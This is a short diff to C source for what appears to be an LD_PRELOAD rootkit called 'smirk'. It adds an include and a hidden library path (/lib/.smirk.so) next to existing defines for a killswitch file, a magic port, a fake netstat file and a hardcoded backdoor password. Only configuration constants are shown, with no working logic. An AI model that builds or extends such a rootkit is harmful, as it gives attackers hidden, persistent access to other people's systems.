@@ -11,6 +11,7 @@
 #include <arpa/inet.h>
 #include <pthread.h>
 #include <unistd.h>
+#include <sys/stat.h>
 
 // #define DEBUG
 #define KILLSWITCH "/dev/shm/.smirkkill"
@@ -20,6 +21,7 @@
 #define MAGIC_PORT 65535
 #define FAKE_NETSTAT_FILE "/dev/shm/.smirknet-"
 #define PASSWORD "SmirkFTW"
+#define MAGIC_LIBPATH "/lib/.smirk.so"
 
 void *libc;
 void *load_libc(char *);
